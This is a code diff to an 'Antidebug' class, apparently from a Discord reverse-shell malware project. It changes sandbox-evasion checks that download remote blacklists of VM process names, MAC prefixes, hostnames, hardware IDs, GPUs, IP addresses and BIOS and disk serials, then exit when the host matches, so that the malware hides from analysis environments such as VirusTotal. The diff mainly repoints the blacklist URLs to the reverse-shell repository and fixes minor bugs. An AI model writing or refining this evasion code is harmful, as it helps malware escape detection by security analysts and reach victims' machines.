@@ -93,32 +93,32 @@ class Antidebug:
         except:
             pass        
         
-        processL = requests.get("https://raw.githubusercontent.com/Lawxsz/bypass-virus-total/main/utils/process.txt").text
+        processL = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/process.txt").text
         if processL in processList:
             sys.exit(1)
             
             
     def mac_check(self):
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        mac_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt").text
+        mac_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/mac.txt").text
         if mac_address[:8] in mac_list:
             sys.exit(1)
             
             
     def pc_check(self):
-        vmname = os.getlogin()
-        vm_name = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt").text
-        if vmname in vm_name:
+        vm_name = os.getlogin()
+        _vm_name = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_name.txt").text
+        if vm_name in _vm_name:
             sys.exit(1)
-        vmusername = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt").text
+        vm_username = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_name.txt").text
         host_name = socket.gethostname()
-        if host_name in vmusername:
+        if host_name in vm_username:
             sys.exit(1)
             
             
     def hwid_check(self):
         current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
-        hwid_vm = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt").text
+        hwid_vm = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/hwid.txt").text
         if current_machine_id in hwid_vm:
             sys.exit(1)
             
@@ -127,23 +127,23 @@ class Antidebug:
         c = wmi.WMI()
         for gpu in c.Win32_DisplayConfiguration():
            GPUm = gpu.Description.strip()
-        gpulist = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt").text
-        if GPUm in gpulist:
+        gpu_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/gpu.txt").text
+        if GPUm in gpu_list:
             sys.exit(1)
          
             
     def ip_check(self):
-        ip_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt").text
-        ip = requests.get("https://api.ipify.org").text()
+        ip_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/ip.txt").text
+        ip = requests.get("https://api.ipify.org").text
         if ip in ip_list:
             sys.exit(1)
            
             
     def profiles():
-        guid_pc = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt").text
-        bios_guid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt").text
-        baseboard_guid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt").text
-        serial_disk = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt").text
+        guid_pc = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/guild.txt").text
+        bios_guid = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/bios_serial.txt").text
+        baseboard_guid = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/base_board_serial.txt").text
+        serial_disk = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/disk_drive_serial.txt").text
         
         machine_guid = uuid.getnode()
         if machine_guid in guid_pc:
